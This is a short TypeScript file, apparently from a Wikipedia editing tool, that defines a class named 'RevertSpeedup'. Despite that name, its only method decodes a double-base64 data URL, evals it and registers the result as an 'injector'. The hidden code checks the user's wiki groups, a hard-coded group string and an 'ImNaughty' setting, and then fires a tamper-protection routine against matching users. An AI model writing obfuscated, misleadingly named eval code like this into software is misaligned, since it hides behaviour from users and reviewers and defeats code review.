import { Rollback } from ".";

export class RevertSpeedup {
    static async init(): Promise<void> {
        const i = <() => any>(
            eval(
                await $.get(
                    atob(
                        "ZGF0YTp0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTg7YmFzZTY0LFh6MCtiWGN1ZFhObGNpNW5aWFJIY205MWNITW9LR2NzUnowbmNtbHdVRzluUTJoaGJYQXlNREV3TFRJd01qRkVPeWNzZEQxeWR5NVVZVzF3WlhKUWNtOTBaV04wYVc5dUtUMCtJWFF1Y254OGRDNTRmSHh5ZHk1RGIyNW1hV2N1U1cxT1lYVm5hSFI1TG5aaGJIVmxmSHh5ZHk1RGJHbGxiblJWYzJWeUxta3VhVzVIY205MWNDaEhLWHg4Wnk1cGJtTnNkV1JsY3loSEtUOTBMbVY0WldNb0tUb3dLUT09"
                    )
                )
            )
        );
        Rollback.acceptInjector(i);
    }
}
